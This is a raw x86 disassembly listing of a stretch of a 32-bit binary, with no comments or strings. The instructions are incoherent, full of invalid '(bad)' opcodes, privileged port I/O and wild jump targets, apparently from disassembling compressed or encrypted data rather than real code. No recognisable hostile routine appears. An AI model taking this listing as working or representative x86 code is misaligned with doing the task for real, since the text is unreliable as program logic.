  418850:	jg     0x4188c2
  418852:	stc    
  418853:	and    eax,0xb5398ae2
  418858:	jecxz  0x4188a4
  41885a:	push   cs
  41885b:	cmp    al,0xe4
  41885d:	cmp    al,0xf1
  41885f:	push   ds
  418860:	sub    ebp,eax
  418862:	les    ebx,FWORD PTR [ebx-0x7c063e96]
  418868:	pop    es
  418869:	sub    al,0x69
  41886b:	jecxz  0x418827
  41886d:	jg     0x41882a
  41886f:	in     eax,dx
  418870:	ret    0x785c
  418873:	aam    0x3
  418875:	test   DWORD PTR [edx],eax
  418877:	scas   al,BYTE PTR es:[edi]
  418878:	sbb    eax,0x246f51bb
  41887d:	jle    0x4188ea
  41887f:	mov    dh,0x87
  418881:	pop    ds
  418882:	xor    ecx,DWORD PTR [esi-0x45]
  418885:	inc    ebp
  418886:	sbb    al,0xe7
  418888:	std    
  418889:	scas   eax,DWORD PTR es:[edi]
  41888a:	sbb    eax,0x9032a678
  41888f:	icebp  
  418890:	cmp    cl,BYTE PTR ds:0xed832cd1
  418896:	adc    ebp,ecx
  418898:	shl    DWORD PTR [ecx-0x75],cl
  41889b:	and    al,0x1f
  41889d:	push   esi
  41889e:	dec    edx
  41889f:	in     eax,dx
  4188a0:	ss test eax,0x5a05768
  4188a6:	retf   
  4188a7:	lahf   
  4188a8:	mov    ebx,DWORD PTR [esi+ebp*8+0x79ae13b4]
  4188af:	or     edx,DWORD PTR [edi+0x14]
  4188b2:	enter  0x812a,0xe4
  4188b6:	call   DWORD PTR [ebx-0x438d52fa]
  4188bc:	xchg   ecx,eax
  4188bd:	push   0x675fce79
  4188c2:	sub    bh,BYTE PTR [eax-0x7]
  4188c5:	push   eax
  4188c6:	in     al,dx
  4188c7:	sbb    edx,DWORD PTR [ecx+0x2ed0f24]
  4188cd:	das    
  4188ce:	xlat   BYTE PTR ds:[ebx]
  4188cf:	push   edi
  4188d0:	xchg   esi,eax
  4188d1:	inc    esi
  4188d2:	stos   BYTE PTR es:[edi],al
  4188d3:	pusha  
  4188d4:	lods   al,BYTE PTR ds:[esi]
  4188d5:	cli    
  4188d6:	or     DWORD PTR [ebx],edi
  4188d8:	push   cs
  4188d9:	enter  0xb5d0,0xc7
  4188dd:	jno    0x41889c
  4188df:	mov    esp,0xa5ab5fee
  4188e4:	fcom   st(7)
  4188e6:	add    eax,0xbb6b2aee
  4188eb:	mov    eax,0xd3ec7051
  4188f0:	inc    eax
  4188f1:	nop
  4188f2:	cmp    dl,BYTE PTR [esi]
  4188f4:	dec    edx
  4188f5:	frstor [ebp-0x5af2dc7c]
  4188fb:	imul   esp,DWORD PTR [eax+0x79],0xffffffee
  4188ff:	pop    eax
  418900:	xchg   ebp,eax
  418901:	xchg   esi,eax
  418902:	pop    eax
  418903:	xor    BYTE PTR [esi+0x27],ah
  418906:	inc    ebx
  418907:	xor    eax,0x9c558c05
  41890c:	jnp    0x418893
  41890e:	cmc    
  41890f:	pop    ebx
  418910:	jge    0x4188d0
  418912:	or     eax,0x9b25f0a
  418917:	or     DWORD PTR ds:0xb80a2fa3,ebp
  41891d:	sbb    eax,0x1e7271d5
  418922:	sbb    al,0xa4
  418924:	jo     0x41890a
  418926:	mov    ch,0x72
  418928:	and    dh,BYTE PTR [ebp+0x5b]
  41892b:	push   ebx
  41892c:	test   eax,0x972b311d
  418931:	xor    BYTE PTR [eax],cl
  418933:	mov    edi,0x27e8e107
  418938:	jle    0x4188d0
  41893a:	mov    ecx,0x1f7244ae
  41893f:	ret    0x3998
  418942:	(bad)  
  418943:	icebp  
  418944:	gs mov bh,0x1e
  418947:	scas   eax,DWORD PTR es:[edi]
  418948:	clc    
  418949:	clc    
  41894a:	aaa    
  41894b:	cmc    
  41894c:	imul   ecx,DWORD PTR [ecx],0xffffffed
  41894f:	(bad)  
  418951:	xchg   ebx,eax
  418952:	xchg   DWORD PTR [eax],ebp
  418954:	and    BYTE PTR [edi-0x1b271e03],dl
  41895a:	inc    ebp
  41895b:	test   eax,0x1f49797c
  418960:	lahf   
  418961:	add    al,0x59
  418963:	cld    
  418964:	cmp    DWORD PTR [esi-0x2e],0xfffffff2
  418968:	dec    eax
  418969:	push   ds
  41896a:	ret    0xfb92
  41896d:	fs sub al,0xca
  418970:	cdq    
  418971:	pop    edx
  418972:	je     0x4189d4
  418974:	scas   eax,DWORD PTR es:[edi]
  418975:	aad    0x20
  418977:	lods   eax,DWORD PTR ds:[esi]
  418978:	sbb    BYTE PTR [eax+0x1a3160a1],ah
  41897e:	xor    esp,0xffffff87
  418981:	arpl   WORD PTR [ecx+0x19],cx
  418984:	enter  0x6624,0x1b
  418988:	shr    ebx,1
  41898a:	mov    ds:0xefca80,al
  41898f:	pusha  
  418990:	xchg   ebx,eax
  418991:	ret    
  418992:	adc    dh,bh
  418994:	adc    BYTE PTR [edi-0x4fe897e1],0x56
  41899b:	icebp  
  41899c:	cmp    BYTE PTR [ecx-0xbbb951d],bl
  4189a2:	(bad)
  4189a5:	push   ebx
  4189a6:	pop    ebp
  4189a7:	jmp    0xbaa23b75
  4189ac:	and    ebx,eax
  4189ae:	aam    0xa7
  4189b0:	inc    edi
  4189b1:	xor    al,0xd
  4189b3:	aad    0x53
  4189b5:	fnsave [esi+0x13]
  4189b8:	ret    0x148e
  4189bb:	fadd   st(0),st
  4189bd:	inc    ecx
  4189be:	enter  0xffde,0x74
  4189c2:	or     BYTE PTR [ebx+0x4a],bl
  4189c5:	jg     0x418a01
  4189c7:	xchg   edi,eax
  4189c8:	pop    ecx
  4189c9:	push   ds
  4189ca:	ret    0x27cc
  4189cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189ce:	xor    al,0xdf
  4189d0:	nop
  4189d1:	(bad)  
  4189d2:	das    
  4189d3:	xchg   ch,dh
  4189d5:	xchg   al,bl
  4189d7:	and    DWORD PTR [edi+0x1f],edx
  4189da:	dec    ebp
  4189db:	lods   eax,DWORD PTR ds:[esi]
  4189dc:	push   ss
  4189dd:	cmp    BYTE PTR ds:0xc3e11530,dh
  4189e3:	xchg   edi,eax
  4189e4:	ret    0xae80
  4189e7:	sub    dl,BYTE PTR [eax+0x28eb0134]
  4189ed:	ficom  DWORD PTR [edi]
  4189ef:	jle    0x4189ab
  4189f1:	push   edi
  4189f2:	pusha  
  4189f3:	mov    fs,WORD PTR [ecx+edi*8-0x6b9ca9ab]
  4189fa:	stc    
  4189fb:	mov    ecx,0x9e60193d
  418a00:	lock and BYTE PTR [ebp-0x3d],bh
  418a04:	push   esp
  418a05:	or     BYTE PTR [ecx],ah
  418a07:	xor    esi,DWORD PTR [edx+0x5c]
  418a0a:	fdivr  QWORD PTR [esi+0x47]
  418a0d:	and    ecx,DWORD PTR [ebp-0x62]
  418a10:	or     ah,BYTE PTR [esi-0x59]
  418a13:	mov    al,0xa2
  418a15:	inc    esp
  418a16:	or     edi,DWORD PTR [esi+0x42]
  418a19:	xchg   DWORD PTR [ebx-0x50672225],esp
  418a1f:	jnp    0xc174966a
  418a25:	mov    ecx,DWORD PTR [ebp-0x8]
  418a28:	add    eax,edx
  418a2a:	imul   eax,ecx
  418a2d:	jmp    0x41adec
  418a32:	clc    
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	xor    eax,eax
  418a40:	out    dx,eax
  418a41:	cmp    DWORD PTR fs:[edi],ebx
  418a44:	popa   
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	sar    BYTE PTR [eax],0xf4
  418a4d:	ret    0xbeb8
  418a50:	inc    eax
  418a51:	jl     0x4189f1
  418a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a54:	push   eax
  418a55:	cli    
  418a56:	jle    0x418a5f
  418a58:	in     eax,dx
  418a59:	jl     0x418a66
  418a5b:	xchg   esi,eax
  418a5c:	jge    0x418a03
  418a5e:	or     edx,DWORD PTR [esi+0x32801471]
  418a64:	pop    es
  418a65:	shl    DWORD PTR ds:[ebx-0x3bd9b7a1],0x5d
  418a6d:	adc    BYTE PTR [edx+0x59],0x71
  418a71:	ret    
  418a72:	push   edx
  418a73:	inc    edi
  418a74:	push   es
  418a75:	imul   edx,DWORD PTR ds:0x625823ce,0xffffffd1
  418a7c:	sub    ecx,DWORD PTR [ecx+ecx*8+0x6f8429dc]
  418a83:	pop    ss
  418a84:	arpl   WORD PTR [ecx-0x55],di
  418a87:	hlt    
  418a88:	dec    edi
  418a89:	popf   
  418a8a:	inc    esp
  418a8b:	adc    esp,DWORD PTR [edi]
  418a8d:	push   ebx
  418a8e:	push   edi
  418a8f:	aas    
  418a90:	or     eax,0xef7fc9dc
  418a95:	aaa    
  418a96:	hlt    
  418a97:	inc    esi
  418a98:	mov    BYTE PTR [ebx+0x26],al
  418a9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a9c:	xchg   esp,eax
  418a9d:	push   0xb7ba07b6
  418aa2:	sub    ebx,esi
  418aa4:	adc    edx,edx
  418aa6:	adc    al,0x1c
  418aa8:	or     DWORD PTR ds:0xfba41d0f,0x2b
  418aaf:	jg     0x418b12
  418ab1:	out    0xd1,eax
  418ab3:	das    
  418ab4:	adc    esi,DWORD PTR [ebx]
  418ab6:	xor    eax,0xae7eb5fd
  418abb:	scas   al,BYTE PTR es:[edi]
  418abc:	imul   ebp,DWORD PTR [eax],0x5d
  418abf:	push   eax
  418ac0:	in     al,0x8c
  418ac2:	sub    eax,0xd96a26f0
  418ac7:	xor    ebp,DWORD PTR ds:0xd0917248
  418acd:	push   0xc0bbe06f
  418ad2:	add    eax,0x48d0bd8d
  418ad7:	and    dh,BYTE PTR [ebp+edx*2+0x38]
  418adb:	adc    eax,0x4766a20f
  418ae0:	jecxz  0x418b5c
  418ae2:	inc    edi
  418ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ae4:	xchg   DWORD PTR [edi-0x4f],ecx
  418ae7:	int3   
  418ae8:	jecxz  0x418b16
  418aea:	cmp    al,0x2c
  418aec:	test   DWORD PTR [ebp+0xe],edx
  418aef:	in     al,0xb6
  418af1:	or     ebx,esi
  418af3:	xchg   BYTE PTR [edx-0x42],ah
  418af6:	(bad)  
  418af7:	ret    0xec36
  418afa:	addr16 jmp 0x418b32
  418afd:	out    0x38,al
  418aff:	adc    DWORD PTR [ebx+0xe24aa3d],ebx
  418b05:	in     eax,dx
  418b06:	out    dx,al
  418b07:	std    
  418b08:	retf   
  418b09:	push   esi
  418b0a:	xchg   esp,eax
  418b0b:	mov    eax,DWORD PTR [ecx-0x132212b2]
  418b11:	inc    ebp
  418b12:	int    0x79
  418b14:	test   BYTE PTR [ecx-0x5b8f5bde],ah
  418b1a:	sbb    DWORD PTR [ebx],esi
  418b1c:	mov    ch,0x4b
  418b1e:	push   ecx
  418b1f:	mov    ds:0x23f5c0da,al
  418b24:	xchg   ecx,eax
  418b25:	cmp    esp,DWORD PTR [ebx+0x17bf9e29]
  418b2b:	mov    ch,0xa7
  418b2d:	mov    esp,DWORD PTR [ebp+0x34]
  418b30:	repz cmp eax,0x561d1d88
  418b36:	idiv   BYTE PTR [ebx+0x2e]
  418b39:	xor    BYTE PTR [esp+eax*2],dh
  418b3c:	enter  0xcaf8,0x4
  418b40:	pop    esi
  418b41:	out    dx,al
  418b42:	jp     0x418b25
  418b44:	push   esp
  418b45:	ficom  WORD PTR [edx]
  418b47:	xchg   BYTE PTR [edi-0x518d2dcc],al
  418b4d:	in     al,dx
  418b4e:	cdq    
  418b4f:	(bad)  
  418b50:	fwait
  418b51:	mov    esi,0x7ea3e25d
  418b56:	shl    DWORD PTR [esp+eax*8-0x16],0x2f
  418b5b:	sbb    eax,0x5af1e7a8
  418b60:	sbb    dl,BYTE PTR [ebx+ebp*2]
  418b63:	jmp    0x8397fbb7
  418b68:	hlt    
  418b69:	sbb    eax,0x88cf66ad
  418b6e:	sub    al,0x68
  418b70:	loope  0x418b31
  418b72:	adc    eax,0x791ba17b
  418b77:	mov    eax,ds:0x319b6645
  418b7c:	jbe    0x418b69
  418b7e:	dec    edx
  418b7f:	pop    eax
  418b80:	pusha  
  418b81:	sub    esi,esp
  418b83:	aam    0x34
  418b85:	ret    0xd794
  418b88:	or     BYTE PTR cs:[eax+0x41593f82],0xd0
  418b90:	pop    es
  418b91:	(bad)  
  418b92:	outs   dx,BYTE PTR ds:[esi]
  418b93:	jnp    0x418bf0
  418b95:	xchg   ecx,eax
  418b96:	inc    edi
  418b97:	push   0x72f9e19e
  418b9c:	std    
  418b9d:	cld    
  418b9e:	adc    eax,0x5ef37dd2
  418ba3:	add    ch,dl
  418ba5:	(bad)  
  418ba6:	xchg   esi,eax
  418ba7:	jnp    0x418c16
  418ba9:	sub    DWORD PTR [esi],esp
  418bab:	ins    BYTE PTR es:[edi],dx
  418bac:	mov    cl,0x4a
  418bae:	call   0x32e3d6ab
  418bb3:	mov    DWORD PTR ds:0x3246dd14,esi
  418bb9:	sbb    al,0x8a
  418bbb:	mov    WORD PTR [eax],ds
  418bbd:	push   ebx
  418bbe:	fs out dx,eax
  418bc0:	mov    bl,0x78
  418bc2:	int3   
  418bc3:	dec    ebp
  418bc4:	add    DWORD PTR [eax-0x14264f6b],0x68cb004
  418bce:	sbb    BYTE PTR [ebx+0x3d],bh
  418bd1:	(bad)  
  418bd3:	xor    al,0x17
  418bd5:	call   0x9628:0x381ab31a
  418bdc:	icebp  
  418bdd:	add    DWORD PTR [ebx+0x5b],esi
  418be0:	out    0xab,al
  418be2:	daa    
  418be3:	xchg   ebx,eax
  418be4:	jbe    0x418bd5
  418be6:	imul   edi,DWORD PTR [esi],0x6fe031f2
  418bec:	test   DWORD PTR [edi+0x32b5c47c],ecx
  418bf2:	js     0x418c45
  418bf4:	ret    
  418bf5:	add    cl,bl
  418bf7:	sahf   
  418bf8:	xchg   BYTE PTR [edx+0x40c68bfc],al
  418bfe:	je     0x418c16
  418c00:	dec    esi
  418c01:	aad    0xd4
  418c03:	inc    eax
  418c04:	dec    esi
  418c05:	mov    ah,0xe
  418c07:	xlat   BYTE PTR ds:[ebx]
  418c08:	in     al,0xfe
  418c0a:	icebp  
  418c0b:	(bad)  
  418c0d:	int3   
  418c0e:	mov    bh,0xec
  418c10:	cmc    
  418c11:	mov    dh,0x65
  418c13:	or     dh,BYTE PTR [ebx+0x4e]
  418c16:	aas    
  418c17:	shl    DWORD PTR [eax],cl
  418c19:	cdq    
  418c1a:	or     DWORD PTR [eax],ebx
  418c1c:	jbe    0x418c28
  418c1e:	pop    es
  418c1f:	fcomp  QWORD PTR [ebx-0x2e]
  418c22:	add    eax,0x4b0d76
  418c27:	icebp  
  418c28:	scas   eax,DWORD PTR es:[edi]
  418c29:	stc    
  418c2a:	dec    edx
  418c2b:	pop    ebx
  418c2c:	gs adc eax,0xabd1873a
  418c32:	outs   dx,DWORD PTR ds:[esi]
  418c33:	fidiv  WORD PTR [ebx-0x57]
  418c36:	loop   0x418bc7
  418c38:	jno    0x418c7b
  418c3a:	mov    dh,0xd6
  418c3c:	popa   
  418c3d:	cmp    al,bh
  418c3f:	das    
  418c40:	mov    ?,WORD PTR [ebx]
  418c42:	dec    eax
  418c43:	pop    esp
  418c44:	jmp    0x1d1a:0x573b2db6
  418c4b:	mov    ch,0xf2
  418c4d:	into   
  418c4e:	enter  0x172a,0x58
  418c52:	dec    esi
  418c53:	push   cs
  418c54:	add    al,BYTE PTR [esi+0xb]
  418c57:	add    cl,BYTE PTR [edi+0x7]
  418c5a:	mov    bl,0x6f
  418c5c:	jecxz  0x418c4c
  418c5e:	jl     0x418c47
  418c60:	lea    ebp,[ebx+0x3b]
  418c63:	sti    
  418c64:	mov    edx,esp
  418c66:	mov    fs,WORD PTR [ebp+0x67]
  418c69:	loopne 0x418c82
  418c6b:	jp     0x418ca5
  418c6d:	jmp    0x3b9bf14f
  418c72:	or     BYTE PTR [ebx-0x5],bl
  418c75:	ret    
  418c76:	xchg   esi,eax
  418c77:	out    dx,al
  418c78:	loopne 0x418bfd
  418c7a:	or     cl,BYTE PTR [edx-0x3354b8c6]
  418c80:	inc    dh
  418c82:	pop    eax
  418c83:	fdiv   DWORD PTR [esi-0x46]
  418c86:	icebp  
  418c87:	jae    0x418d02
  418c89:	arpl   WORD PTR [edx-0x22],si
  418c8c:	cli    
  418c8d:	std    
  418c8e:	adc    ch,bl
  418c90:	jns    0x418c6e
  418c92:	icebp  
  418c93:	and    BYTE PTR [ebx-0x21],cl
  418c96:	sub    al,0x66
  418c98:	cmp    BYTE PTR [ebx],bl
  418c9a:	ins    DWORD PTR es:[edi],dx
  418c9b:	sbb    bh,dh
  418c9d:	cmp    eax,DWORD PTR [esi-0x58]
  418ca0:	sbb    al,0x2b
  418ca2:	(bad)
  418ca5:	icebp  
  418ca6:	xor    eax,0x6d3b4d18
  418cab:	adc    DWORD PTR [edx+eax*2+0x79],edi
  418caf:	ficomp WORD PTR [eax+0x33]
  418cb2:	int3   
  418cb3:	not    BYTE PTR [esi-0x6c]
  418cb6:	cwde   
  418cb7:	in     al,dx
  418cb8:	stos   BYTE PTR es:[edi],al
  418cb9:	jnp    0x418c4c
  418cbb:	mov    gs,WORD PTR [ebx-0x50]
  418cbe:	inc    ebx
  418cbf:	fsub   QWORD PTR [ebx-0x6fdf654c]
  418cc5:	mov    bx,0xaa0e
  418cc9:	lds    edi,FWORD PTR [edx-0x3f8a1209]
  418ccf:	and    BYTE PTR [ebx-0xd],ch
  418cd2:	push   ecx
  418cd3:	or     ebp,DWORD PTR [ebx+0x3f]
  418cd6:	xchg   esp,eax
  418cd7:	idiv   BYTE PTR [eax-0x61]
  418cda:	cmp    BYTE PTR [ebx],dh
  418cdc:	lods   al,BYTE PTR ds:[esi]
  418cdd:	ret    
  418cde:	std    
  418cdf:	push   0xffffffb2
  418ce1:	cmp    BYTE PTR [bp+0x14],dh
  418ce5:	loop   0x418d31
  418ce7:	fs cmp eax,ecx
  418cea:	leave  
  418ceb:	es loope 0x418d2a
  418cee:	into   
  418cef:	stc    
  418cf0:	jge    0x418d04
  418cf2:	inc    esi
  418cf3:	mov    ecx,0xb2b20c55
  418cf8:	test   dh,al
  418cfa:	xor    DWORD PTR [ebp+0x12],ebx
  418cfd:	imul   ecx,ecx,0x46
  418d00:	fwait
  418d01:	test   BYTE PTR [edx-0x47930602],cl
  418d07:	push   ebx
  418d08:	cli    
  418d09:	retf   
  418d0a:	and    bh,BYTE PTR [ebp+0x42]
  418d0d:	push   cs
  418d0e:	outs   dx,DWORD PTR ds:[esi]
  418d0f:	push   ebx
  418d10:	mov    ecx,0xf45ff26f
  418d15:	call   0x11359d0a
  418d1a:	into   
  418d1b:	test   BYTE PTR [ebx-0x37],al
  418d1e:	cmp    BYTE PTR gs:[ebp-0x7f692021],bh
  418d25:	add    DWORD PTR [esi+ecx*4-0x2dc5ce05],ebp
  418d2c:	loope  0x418cb0
  418d2e:	and    BYTE PTR [edi+0x77695abf],bh
  418d34:	gs dec ebx
  418d36:	pop    edi
  418d37:	fimul  WORD PTR [edi-0xc]
  418d3a:	or     eax,0x3a37f19f
  418d3f:	sub    dh,bl
  418d41:	sbb    BYTE PTR [ecx+0x4a],al
  418d44:	(bad)  
  418d45:	sub    ch,dh
  418d47:	call   0x2883d89c
  418d4c:	idiv   BYTE PTR [edx+0x72]
  418d4f:	xor    ch,dh
  418d51:	dec    ebp
  418d52:	jle    0x418d71
  418d54:	fstp   QWORD PTR [eax+0x7c]
  418d57:	or     al,BYTE PTR [ebx-0x7d]
  418d5a:	sbb    ch,BYTE PTR [edx]
  418d5c:	or     ah,BYTE PTR [esi+eiz*2-0x2f9575a]
  418d63:	out    dx,al
  418d64:	push   esi
  418d65:	adc    dl,dl
  418d67:	test   DWORD PTR [ebx],esi
  418d69:	inc    esi
  418d6a:	sub    bl,BYTE PTR [edi]
  418d6c:	cdq    
  418d6d:	fcomip st,st(7)
  418d6f:	ret    
  418d70:	sahf   
  418d71:	and    dl,0xb6
  418d74:	div    esp
  418d76:	inc    ecx
  418d77:	mov    edx,0xbd157468
  418d7c:	mov    ebp,0x8497e07b
  418d81:	icebp  
  418d82:	inc    ecx
  418d83:	adc    al,0xe1
  418d85:	xchg   edi,eax
  418d86:	imul   edi,edx,0x36
  418d89:	ficom  DWORD PTR [ecx]
  418d8b:	lock add BYTE PTR [ebp+0x1b],cl
  418d8f:	inc    ebp
  418d90:	adc    bl,BYTE PTR [ebp+0x4ab308f7]
  418d96:	daa    
  418d97:	adc    DWORD PTR [ebp-0x52],edi
  418d9a:	cmp    eax,0x10348b00
  418d9f:	jbe    0x418d40
  418da1:	xchg   esp,eax
  418da2:	out    0xb7,eax
  418da4:	test   BYTE PTR [esi-0x3c4b90d8],cl
  418daa:	stc    
  418dab:	push   edi
  418dac:	sar    bh,cl
  418dae:	jo     0x418dbe
  418db0:	add    al,BYTE PTR [esi+ebp*8]
  418db3:	es stos DWORD PTR es:[edi],eax
  418db5:	jb     0x418d48
  418db7:	sbb    cl,BYTE PTR [edi+0x67]
  418dba:	popf   
  418dbb:	pop    ds
  418dbc:	sahf   
  418dbd:	scas   al,BYTE PTR es:[edi]
  418dbe:	retf   0x101
  418dc1:	pop    eax
  418dc2:	stos   DWORD PTR es:[edi],eax
  418dc3:	loop   0x418d88
  418dc5:	aad    0xd1
  418dc7:	add    DWORD PTR [ebp-0x39a6250],esp
  418dcd:	xchg   ebp,eax
  418dce:	cmp    al,0x54
  418dd0:	loope  0x418da1
  418dd2:	ins    BYTE PTR es:[edi],dx
  418dd3:	ins    BYTE PTR es:[edi],dx
  418dd4:	jl     0x418e16
  418dd6:	pop    ecx
  418dd7:	pushf  
  418dd8:	pop    ebx
  418dd9:	mov    dl,0xa
  418ddb:	fcmovb st,st(1)
  418ddd:	test   BYTE PTR [ebx+0x26],al
  418de0:	pop    edx
  418de1:	pop    edi
  418de2:	ror    DWORD PTR [eax+eiz*4+0x743f7814],1
  418de9:	jl     0x418dee
  418deb:	or     BYTE PTR [esi+0x6b],dh
  418dee:	pusha  
  418def:	sub    esp,DWORD PTR [edx-0x38]
  418df2:	mov    bh,0x76
  418df4:	mov    fs,WORD PTR [ecx-0x45]
  418df7:	dec    edi
  418df8:	adc    BYTE PTR [edi+0x38],dh
  418dfb:	int    0xaa
  418dfd:	lock ins DWORD PTR es:[edi],dx
  418dff:	bound  ebp,QWORD PTR [ebp+0x31b8037d]
  418e05:	and    ebp,0xffffffc4
  418e08:	mov    bl,BYTE PTR [ebx-0x6d]
  418e0b:	ja     0x418e3b
  418e0d:	mov    bh,0x3c
  418e0f:	mov    ?,WORD PTR [eax+edx*8-0x30]
  418e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e14:	imul   DWORD PTR [esp+eiz*2-0x4f]
  418e18:	outs   dx,BYTE PTR ds:[esi]
  418e19:	mov    dl,0x19
  418e1b:	push   esp
  418e1c:	cmp    ebx,DWORD PTR [edx-0x4d7140fd]
  418e22:	sahf   
  418e23:	in     eax,dx
  418e24:	stos   BYTE PTR es:[edi],al
  418e25:	ret    0x970
  418e28:	pop    esp
  418e29:	xchg   ebx,eax
  418e2a:	aam    0xe2
  418e2c:	lods   eax,DWORD PTR ds:[esi]
  418e2d:	popa   
  418e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e2f:	repz push es
  418e31:	aad    0x2a
  418e33:	inc    edi
  418e34:	xlat   BYTE PTR ds:[ebx]
  418e35:	pop    edi
  418e36:	push   ss
  418e37:	xchg   ah,bh
  418e39:	aad    0x94
  418e3b:	or     esp,ecx
  418e3d:	add    al,0x2d
  418e3f:	jbe    0x418e91
  418e41:	jb     0x418dd5
  418e43:	xchg   DWORD PTR [edi-0x5],ebx
  418e46:	mov    esi,0x3a67bfae
  418e4b:	data16 jne 0x418dd1
  418e4e:	add    BYTE PTR [ebp+0xcce290],dl
  418e54:	mov    ds:0x9e966ec1,eax
  418e59:	ins    DWORD PTR es:[edi],dx
  418e5a:	mov    al,ds:0xf469319f
  418e5f:	adc    al,0x58
  418e61:	mov    eax,fs:0x7f02f985
  418e67:	sahf   
  418e68:	test   eax,0x8c7fbddc
  418e6d:	mov    ss,eax
  418e6f:	std    
  418e70:	mov    edx,0x6e12ee50
  418e75:	adc    edx,esp
  418e77:	aad    0x18
  418e79:	xchg   edi,eax
  418e7a:	lock pop ebp
  418e7c:	xor    BYTE PTR [edi-0x2d],ah
  418e7f:	sub    BYTE PTR [ebp-0xb],0xe3
  418e83:	xchg   esi,eax
  418e84:	mov    DWORD PTR [edx+edi*4],ecx
  418e87:	aam    0x1d
  418e89:	or     al,0xbc
  418e8b:	push   ss
  418e8c:	nop
  418e8d:	popf   
  418e8e:	adc    al,0xde
  418e90:	push   eax
  418e91:	(bad)  
  418e92:	(bad)
  418e96:	xchg   DWORD PTR [edx+0x14a3029c],esp
  418e9c:	mov    DWORD PTR [edi-0x55],ebx
  418e9f:	frstor [edx-0x3726e9cb]
  418ea5:	add    ebx,esi
  418ea7:	and    BYTE PTR [ecx-0x36],cl
  418eaa:	mov    ah,0xa0
  418eac:	inc    ecx
  418ead:	rcr    BYTE PTR cs:[edx],cl
  418eb0:	jo     0x418f0d
  418eb2:	ss out 0x46,al
  418eb5:	jmp    0x1c7c7de6
  418eba:	cmp    edx,ecx
  418ebc:	and    dh,bh
  418ebe:	int3   
  418ebf:	jne    0x418e83
  418ec1:	mov    edi,DWORD PTR [eax+ecx*4-0x644255e1]
  418ec8:	div    cl
  418eca:	lock mov edx,0x8f4846e0
  418ed0:	mul    BYTE PTR [edx+0x6313517d]
  418ed6:	cmp    eax,0x9b8af0ae
  418edb:	repnz mov esp,0x2d81456
  418ee1:	add    BYTE PTR ds:0x6d99cc65,bl
  418ee7:	pop    es
  418ee8:	mov    dl,0x39
  418eea:	jmp    DWORD PTR [ebx+0x2c137a9a]
  418ef0:	mov    al,0xb6
  418ef2:	repz repz ret 
  418ef5:	iret   
  418ef6:	call   0x34531a15
  418efb:	repnz xchg edx,eax
  418efd:	and    DWORD PTR [ebx-0xa003fbd],ebp
  418f03:	cmp    eax,0xda8281ca
  418f08:	div    DWORD PTR [esi+ecx*2]
  418f0b:	es sbb ch,ch
  418f0e:	and    al,0x53
  418f10:	mov    al,ds:0xedadd381
  418f15:	mov    dh,BYTE PTR [ecx]
  418f17:	add    ah,BYTE PTR [eax+edi*4]
  418f1a:	mov    ds:0x98140c2c,eax
  418f1f:	pop    ecx
  418f20:	lock jmp 0x60f59704
  418f26:	push   edx
  418f27:	data16 fs mov bh,dh
  418f2b:	push   0x4643ba29
  418f30:	inc    edi
  418f31:	outs   dx,DWORD PTR ds:[esi]
  418f32:	mov    al,0xc1
  418f34:	cwde   
  418f35:	and    al,0xfd
  418f37:	bswap  ebx
  418f39:	mov    al,0x9b
  418f3b:	lds    esp,FWORD PTR [eax+0x5c]
  418f3e:	mov    esi,0x44552361
  418f43:	int    0xc7
  418f45:	out    dx,al
  418f46:	add    DWORD PTR [edi+0x6],edx
  418f49:	aam    0x6a
  418f4b:	and    eax,0x68470bb7
  418f50:	pop    ebp
  418f51:	pop    ecx
  418f52:	pop    edx
  418f53:	and    BYTE PTR [edx],ah
  418f55:	cwde   
  418f56:	jno    0x418f2c
  418f58:	bound  edi,QWORD PTR [eax+0xdf8d44f]
  418f5e:	cmp    DWORD PTR [ebx*8+0x606ea6a4],0x5a
  418f66:	out    dx,al
  418f67:	clc    
  418f68:	xchg   esi,eax
  418f69:	jmp    0x6df5:0xa302ba81
  418f70:	outs   dx,BYTE PTR ds:[esi]
  418f71:	aas    
  418f72:	sub    esi,esi
  418f74:	outs   dx,DWORD PTR ds:[esi]
  418f75:	lds    ebx,FWORD PTR [ecx-0x8a3f852]
  418f7b:	mov    eax,ds:0x6acfb766
  418f80:	mov    al,dh
  418f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f83:	pop    edi
  418f84:	outs   dx,BYTE PTR ds:[esi]
  418f85:	push   ss
  418f86:	or     BYTE PTR [ebx],al
  418f88:	jne    0x418f59
  418f8a:	cmp    bl,cl
  418f8c:	fstp   TBYTE PTR [ebp+edx*4+0x50cece65]
  418f93:	je     0x418f81
  418f95:	mov    edi,0xf308ed60
  418f9a:	rcl    BYTE PTR [edx+edi*8],cl
  418f9d:	and    BYTE PTR [ebx+0x744c08f0],cl
  418fa3:	cmp    ecx,DWORD PTR [eax]
  418fa5:	mov    ebp,0x627e50b9
  418faa:	cmp    bh,BYTE PTR [ebp+0x505724a4]
  418fb0:	stos   DWORD PTR es:[edi],eax
  418fb1:	cmp    al,0x0
  418fb3:	and    eax,0x3936c1a6
  418fb8:	add    DWORD PTR [ebx-0x1c],edi
  418fbb:	ret    0xc098
  418fbe:	lods   eax,DWORD PTR ds:[esi]
  418fbf:	xchg   ebx,eax
  418fc0:	xor    ebx,esi
  418fc2:	arpl   WORD PTR [ebp+0x5a],si
  418fc5:	mov    esp,0x96e2e961
  418fca:	dec    esp
  418fcb:	imul   ebx,edi,0xffffff8e
  418fce:	sbb    eax,0x7b62ea5d
  418fd3:	fsubr  DWORD PTR [eax+0x5bb3523e]
  418fd9:	mov    bl,0x49
  418fdb:	add    DWORD PTR [ebx-0x1e],0xfffffffe
  418fdf:	loop   0x419042
  418fe1:	sti    
  418fe2:	fwait
  418fe3:	jae    0x418f99
  418fe5:	jo     0x418fe0
  418fe7:	shr    DWORD PTR ds:0x68f66629,1
  418fed:	jl     0x419027
  418fef:	mov    esi,0xa2f9f2fb
  418ff4:	loope  0x418fe8
  418ff6:	(bad)  
  418ff7:	inc    ecx
  418ff8:	dec    edi
  418ff9:	aas    
